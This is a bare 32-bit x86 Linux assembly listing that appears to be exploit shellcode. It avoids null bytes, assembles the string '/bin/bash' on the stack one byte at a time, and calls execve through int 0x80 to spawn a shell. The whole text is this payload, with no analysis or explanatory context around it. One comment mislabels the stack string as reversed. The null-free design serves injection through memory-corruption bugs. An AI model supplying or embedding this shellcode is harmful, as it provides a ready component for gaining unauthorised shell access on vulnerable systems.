section .text
global _start

_start:
    xor eax, eax        ; eax = 0 (no 0x00 in code)
    push eax            ; runtime NULL terminator

    ; push "hsab/nib/"
    sub esp, 9          ; make space for 9 bytes

    mov byte [esp], 0x2f        ; /
    mov byte [esp+1], 0x62      ; b
    mov byte [esp+2], 0x69      ; i
    mov byte [esp+3], 0x6e      ; n
    mov byte [esp+4], 0x2f      ; /
    mov byte [esp+5], 0x62      ; b
    mov byte [esp+6], 0x61      ; a
    mov byte [esp+7], 0x73      ; s
    mov byte [esp+8], 0x68      ; h

    mov ebx, esp        ; filename = "/bin/bash"
    xor ecx, ecx        ; argv = NULL
    xor edx, edx        ; envp = NULL
    mov al, 0x0b        ; execve syscall
    int 0x80